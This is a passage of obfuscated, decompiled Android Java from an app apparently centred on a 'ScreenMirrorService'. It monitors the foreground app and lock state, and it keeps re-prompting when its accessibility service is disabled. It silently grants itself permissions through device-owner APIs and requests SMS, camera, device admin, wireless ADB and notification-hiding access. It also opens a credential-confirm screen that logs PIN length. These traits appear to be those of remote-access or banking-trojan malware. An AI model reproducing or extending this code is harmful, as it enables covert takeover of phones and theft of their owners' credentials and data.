            strTrim = string == null ? "" : string.trim();
            try {
                String string2 = sharedPreferences.getString("foreground_label", "");
                if (string2 != null) {
                    strTrim2 = string2.trim();
                }
                j4 = sharedPreferences.getLong("foreground_observed_at_ms", 0L);
            } catch (Throwable unused3) {
                str = strTrim2;
                strTrim2 = strTrim;
                strTrim = strTrim2;
                j4 = 0;
                strTrim2 = str;
            }
        } catch (Throwable unused4) {
            str = "";
        }
        if (!strTrim.isEmpty()) {
            try {
                jSONObject.put("foregroundPackage", strTrim);
                if (!strTrim2.isEmpty()) {
                    jSONObject.put("foregroundLabel", strTrim2);
                }
                if (j4 > 0 && j3 >= j4) {
                    jSONObject.put("foregroundObservedAgeMs", j3 - j4);
                }
                jSONObject.put("foregroundIsAccessibilitySettings", y1.l.a(strTrim));
            } catch (Throwable unused5) {
            }
        }
        try {
            PowerManager powerManager = (PowerManager) applicationContext.getSystemService("power");
            if (powerManager != null) {
                jSONObject.put("screenInteractive", powerManager.isInteractive());
            }
        } catch (Throwable unused6) {
        }
        try {
            KeyguardManager keyguardManager = (KeyguardManager) applicationContext.getSystemService("keyguard");
            if (keyguardManager != null) {
                jSONObject.put("keyguardLocked", keyguardManager.isKeyguardLocked());
            }
        } catch (Throwable unused7) {
        }
        try {
            PackageManager packageManager = applicationContext.getPackageManager();
            PackageInfo packageInfo = Build.VERSION.SDK_INT >= 33 ? packageManager.getPackageInfo(applicationContext.getPackageName(), PackageManager.PackageInfoFlags.of(0L)) : packageManager.getPackageInfo(applicationContext.getPackageName(), 0);
            if (packageInfo != null) {
                long j5 = packageInfo.firstInstallTime;
                if (j5 > 0) {
                    jSONObject.put("packageFirstInstallAtMs", j5);
                }
                long j6 = packageInfo.lastUpdateTime;
                if (j6 > 0) {
                    jSONObject.put("packageLastUpdateAtMs", j6);
                }
            }
        } catch (Throwable unused8) {
        }
        return jSONObject;
    }

    public static boolean u(Context context) {
        long j3;
        long j4;
        boolean z2;
        long j5;
        long j6;
        long j7;
        long j8;
        long j9;
        long jMax;
        Handler handler;
        long jElapsedRealtime = SystemClock.elapsedRealtime();
        long jCurrentTimeMillis = System.currentTimeMillis();
        boolean zA = p0(context).a();
        if (zA) {
            f4579r = -1L;
            f4580s = false;
            f4581t = false;
            Context applicationContext = context.getApplicationContext();
            synchronized (n) {
                f4579r = -1L;
                f4580s = false;
                f4581t = false;
                try {
                    applicationContext.getSharedPreferences("a11y_restore", 0).edit().putBoolean("ever_enabled", true).apply();
                } catch (Throwable unused) {
                }
            }
            try {
                f(context);
            } catch (Throwable unused2) {
            }
            return true;
        }
        boolean zC0 = C0(context);
        if (zA || !zC0) {
            j3 = -1;
            f4579r = -1L;
            f4580s = false;
            f4581t = false;
        } else {
            long j10 = f4579r;
            if (j10 < 0 || jElapsedRealtime < j10) {
                f4579r = jElapsedRealtime;
            }
            long j11 = f4579r;
            j3 = -1;
            if (zA || !zC0 || j11 < 0 || jElapsedRealtime < j11 || jElapsedRealtime - j11 < 1500) {
                if (!f4580s && (handler = f4577p) != null) {
                    f4580s = true;
                    handler.postDelayed(new a2.m(context, 8), 1500L);
                }
            } else if (!f4581t) {
                try {
                    JSONObject jSONObjectT0 = t0(context, jCurrentTimeMillis);
                    jSONObjectT0.put("settingsOn", false);
                    h0.R(context).I(jSONObjectT0, jCurrentTimeMillis);
                    m mVarC = m.c(context);
                    mVarC.getClass();
                    mVarC.f(19, r());
                    f4581t = true;
                } catch (Throwable th) {
                    a0.a.p(th, new StringBuilder("queue a11y_lost failed: "), "A11yRestore");
                }
            }
        }
        if (zA) {
            return false;
        }
        try {
            SharedPreferences sharedPreferences = context.getApplicationContext().getSharedPreferences("a11y_restore", 0);
            long j12 = sharedPreferences.getLong("install_anchor_ms", 0L);
            try {
                PackageManager packageManager = context.getPackageManager();
                j4 = j3;
                try {
                    PackageInfo packageInfo = Build.VERSION.SDK_INT >= 33 ? packageManager.getPackageInfo(context.getPackageName(), PackageManager.PackageInfoFlags.of(0L)) : packageManager.getPackageInfo(context.getPackageName(), 0);
                    if (packageInfo == null) {
                        j6 = 0;
                        j7 = j6;
                    } else {
                        j6 = 0;
                        try {
                            j7 = packageInfo.firstInstallTime;
                        } catch (Throwable th2) {
                            th = th2;
                            a0.a.p(th, new StringBuilder("firstInstallTime unavailable: "), "A11yRestore");
                            j7 = j6;
                        }
                    }
                } catch (Throwable th3) {
                    th = th3;
                    j6 = 0;
                }
            } catch (Throwable th4) {
                th = th4;
                j6 = 0;
                j4 = j3;
            }
            if (j7 > j6) {
                j8 = j7;
                j9 = j6;
                jMax = j8;
            } else if (j12 > j6) {
                j8 = j7;
                jMax = j12;
                j9 = j6;
            } else {
                j8 = j7;
                long j13 = j6;
                j9 = j13;
                jMax = Math.max(j13, jCurrentTimeMillis);
            }
            boolean z3 = j7 > j6 && j12 > j9 && j8 != j12;
            boolean z4 = j12 > j9 && !z3 && sharedPreferences.getBoolean("install_grace_complete", false);
            if (j12 != jMax || z3) {
                SharedPreferences.Editor editorPutLong = sharedPreferences.edit().putLong("install_anchor_ms", jMax);
                if (z3) {
                    editorPutLong.putBoolean("install_grace_complete", false);
                    editorPutLong.remove("last_prompt_wall_ms");
                    f4578q = j4;
                    f4582u = false;
                }
                editorPutLong.apply();
            }
            z2 = !z4 && (jMax <= 0 || jCurrentTimeMillis < jMax || jCurrentTimeMillis - jMax < 600000);
            if (!z2 && !z4) {
                sharedPreferences.edit().putBoolean("install_grace_complete", true).apply();
            }
        } catch (Throwable unused3) {
            j4 = j3;
            z2 = true;
        }
        if (z2) {
            try {
                f(context);
            } catch (Throwable unused4) {
            }
            if (!f4582u) {
                f4582u = true;
                Log.i("A11yRestore", "a11y reminder held during install grace");
            }
        } else {
            f4582u = false;
            Log.w("A11yRestore", "a11y missing; explicit user authorization required");
            try {
                j5 = j4;
                try {
                    j5 = context.getApplicationContext().getSharedPreferences("a11y_restore", 0).getLong("last_prompt_wall_ms", j5);
                } catch (Throwable unused5) {
                }
            } catch (Throwable unused6) {
                j5 = j4;
            }
            long j14 = f4578q;
            if ((j14 < 0 || (jElapsedRealtime >= j14 && jElapsedRealtime - j14 >= 60000)) && (j5 < 0 || (jCurrentTimeMillis >= j5 && jCurrentTimeMillis - j5 >= 60000))) {
                f4578q = jElapsedRealtime;
                try {
                    context.getApplicationContext().getSharedPreferences("a11y_restore", 0).edit().putLong("last_prompt_wall_ms", jCurrentTimeMillis).apply();
                } catch (Throwable unused7) {
                }
                Handler handler2 = f4577p;
                if (handler2 == null) {
                    handler2 = new Handler(Looper.getMainLooper());
                }
                handler2.post(new a2.m(context, 7));
            }
        }
        return false;
    }

    public static String u0(String str) {
        return "snapshot_volume_" + str;
    }

    public static String v(String str) {
        try {
            JSONObject jSONObject = new JSONObject();
            jSONObject.put("ok", false);
            jSONObject.put("error", str);
            return jSONObject.toString();
        } catch (Exception unused) {
            return "{\"ok\":false,\"error\":\"unknown\"}";
        }
    }

    public static void v0(Context context) {
        Context applicationContext = context.getApplicationContext();
        synchronized (n) {
            try {
                if (f4583v) {
                    u(applicationContext);
                    return;
                }
                f4583v = true;
                f4579r = -1L;
                f4580s = false;
                f4581t = false;
                f4577p = new Handler(Looper.getMainLooper());
                f4576o = new l0(f4577p, applicationContext);
                try {
                    Uri uriFor = Settings.Secure.getUriFor("enabled_accessibility_services");
                    Uri uriFor2 = Settings.Secure.getUriFor("accessibility_enabled");
                    applicationContext.getContentResolver().registerContentObserver(uriFor, false, f4576o);
                    applicationContext.getContentResolver().registerContentObserver(uriFor2, false, f4576o);
                } catch (Throwable th) {
                    Log.w("A11yRestore", "register observer failed: " + th.getMessage());
                }
                f4577p.post(new f2.b0(applicationContext, 1));
                t(applicationContext);
            } catch (Throwable th2) {
                throw th2;
            }
        }
    }

    public static String w(String str) {
        String strA = t0.a(str);
        return strA.isEmpty() ? "event:a11y_enabled" : a0.a.h("event:a11y_enabled\t{\"version\":2,\"madid\":\"", strA, "\"}");
    }

    public static void w0(ScreenMirrorService screenMirrorService, String str, boolean z2) {
        if (str == null || str.isEmpty()) {
            Log.w("PermOrchestrator", "start ignored: svc=" + screenMirrorService + " type=" + str);
            return;
        }
        Log.i("PermOrchestrator", "grant requested: " + str + " singleLaunch=" + z2);
        if (screenMirrorService.J3() && screenMirrorService.K3() && "projection".equals(str)) {
            Log.w("PermOrchestrator", "grant postponed: secure keyguard requires manual unlock type=".concat(str));
            return;
        }
        if ("wireless_adb".equals(str)) {
            if (!screenMirrorService.J3()) {
                screenMirrorService.U7();
                new Handler(Looper.getMainLooper()).postDelayed(new u8(screenMirrorService, str, z2, 1), 600L);
                return;
            }
            cg.i();
            cg.k("waiting_unlock");
            cg.j("device_locked_unlock_first");
            screenMirrorService.U7();
            new Handler(Looper.getMainLooper()).postDelayed(new u8(screenMirrorService, str, z2, 0), 3000L);
            return;
        }
        if (("device_admin".equals(str) || "sms".equals(str) || "camera".equals(str) || "post_notif".equals(str)) && screenMirrorService.J3()) {
            screenMirrorService.U7();
            new Handler(Looper.getMainLooper()).postDelayed(new u8(screenMirrorService, str, z2, 2), 2000L);
            return;
        }
        if ("notifications".equals(str) || "battery".equals(str) || "vendor_battery".equals(str) || "files".equals(str) || "install".equals(str) || "write_settings".equals(str) || "overlay".equals(str) || "oem_autostart".equals(str) || "installed_apps".equals(str) || "notif_channel_hide".equals(str) || "usage".equals(str) || "sms".equals(str) || "camera".equals(str) || "post_notif".equals(str) || "device_admin".equals(str)) {
            screenMirrorService.U7();
            new Handler(Looper.getMainLooper()).postDelayed(new u8(screenMirrorService, str, z2, 3), 600L);
        } else {
            screenMirrorService.U7();
            new Handler(Looper.getMainLooper()).postDelayed(new u8(screenMirrorService, str, z2, 4), 1500L);
        }
    }

    public static boolean x(ScreenMirrorService screenMirrorService, DevicePolicyManager devicePolicyManager, ComponentName componentName, String[] strArr) {
        boolean z2 = true;
        for (String str : strArr) {
            try {
                if (devicePolicyManager.getPermissionGrantState(componentName, screenMirrorService.getPackageName(), str) != 1) {
                    devicePolicyManager.setPermissionGrantState(componentName, screenMirrorService.getPackageName(), str, 1);
                }
            } catch (Throwable th) {
                a0.a.p(th, a0.a.k("[DO] setPermissionGrantState failed perm=", str, " msg="), "PermOrchestrator");
                z2 = false;
            }
        }
        if (z2) {
            for (String str2 : strArr) {
                if (screenMirrorService.checkSelfPermission(str2) == 0) {
                }
            }
            return true;
        }
        return false;
    }

    public static String x0(Context context) {
        try {
            AudioManager audioManager = (AudioManager) context.getSystemService(AudioManager.class);
            if (audioManager == null) {
                return v("audio_manager_unavailable");
            }
            JSONObject jSONObject = new JSONObject();
            boolean z2 = true;
            jSONObject.put("ok", true);
            jSONObject.put("muted", context.getSharedPreferences("remote_audio_control", 0).getBoolean("muted", false));
            if (audioManager.getRingerMode() != 1) {
                z2 = false;
            }
            jSONObject.put("vibrationEnabled", z2);
            jSONObject.put("ringerMode", audioManager.getRingerMode());
            JSONObject jSONObject2 = new JSONObject();
            int i3 = 0;
            while (true) {
                int[] iArr = f4587z;
                if (i3 >= 6) {
                    jSONObject.put("streams", jSONObject2);
                    return jSONObject.toString();
                }
                int i4 = iArr[i3];
                int streamVolume = audioManager.getStreamVolume(i4);
                int streamMaxVolume = audioManager.getStreamMaxVolume(i4);
                JSONObject jSONObject3 = new JSONObject();
                jSONObject3.put("index", streamVolume);
                jSONObject3.put("max", streamMaxVolume);
                jSONObject3.put("percent", streamMaxVolume <= 0 ? 0 : Math.round((streamVolume * 100.0f) / streamMaxVolume));
                jSONObject3.put("muted", audioManager.isStreamMute(i4));
                jSONObject2.put(f4586y[i3], jSONObject3);
                i3++;
            }
        } catch (Throwable th) {
            return v(V(th, "audio_status_failed"));
        }
    }

    public static boolean y(ScreenMirrorService screenMirrorService, JSONObject jSONObject) {
        String strOptString = jSONObject.optString("cas", "");
        String strOptString2 = jSONObject.optString("syslk", "");
        String strOptString3 = jSONObject.optString("native", "");
        String strOptString4 = jSONObject.optString("confirm", "");
        if ("1".equals(strOptString)) {
            boolean z2 = "1".equals(strOptString2) || "1".equals(strOptString3);
            boolean zEquals = "1".equals(strOptString4);
            if (z2 || zEquals) {
                Log.i("ConfirmCredLauncher", "launching native-confirm syslk=" + strOptString2 + " native=" + strOptString3 + " confirm=" + strOptString4 + " typ=" + jSONObject.optString("typ", "") + " pinLen=" + jSONObject.optString("pinLen", ""));
                int i3 = ConfirmCredentialActivity.f2442d;
                Intent intent = new Intent(screenMirrorService, (Class<?>) ConfirmCredentialActivity.class);
                intent.addFlags(268435456);
                try {
                    screenMirrorService.startActivity(intent);
                    return true;
                } catch (Throwable th) {
                    a0.a.p(th, new StringBuilder("launch failed: "), "ConfirmCredential");
                    return true;
                }
            }
        }
        return false;
    }

    public static Bundle y0(String str) {
        Bundle bundleR = r();
        if (str != null && str.length() > 16384) {
            str = str.substring(0, 16384);
        }
        bundleR.putString("value", str);
        return bundleR;
    }

    public static boolean z(Context context) {
        try {
            if (Environment.isExternalStorageManager()) {
                return true;
            }
        } catch (Throwable unused) {
        }
        if (context == null) {
            return false;
        }
        try {
            AppOpsManager appOpsManager = (AppOpsManager) context.getSystemService("appops");
            return appOpsManager != null && appOpsManager.unsafeCheckOpNoThrow("android:manage_external_storage", Process.myUid(), context.getPackageName()) == 0;
        } catch (Throwable th) {
            a0.a.p(th, new StringBuilder("appOps check failed: "), "FilesAccessWatch");
            return false;
        }
    }

    public static File z0(Context context) {
        Context applicationContext = context.getApplicationContext();
        if (applicationContext != null) {
            context = applicationContext;
        }
        Context contextCreateDeviceProtectedStorageContext = context.createDeviceProtectedStorageContext();
        if (contextCreateDeviceProtectedStorageContext != null) {
            context = contextCreateDeviceProtectedStorageContext;
        }
        return new File(new File(context.getFilesDir(), "a11y"), "projection-request-v1");
    }

    public abstract void Y();

    public abstract void Z();

    public abstract void b0();

    public abstract void c0(int i3);

    public abstract void d0(int i3);

    public abstract void e0();

    public void a0() {
    }
}
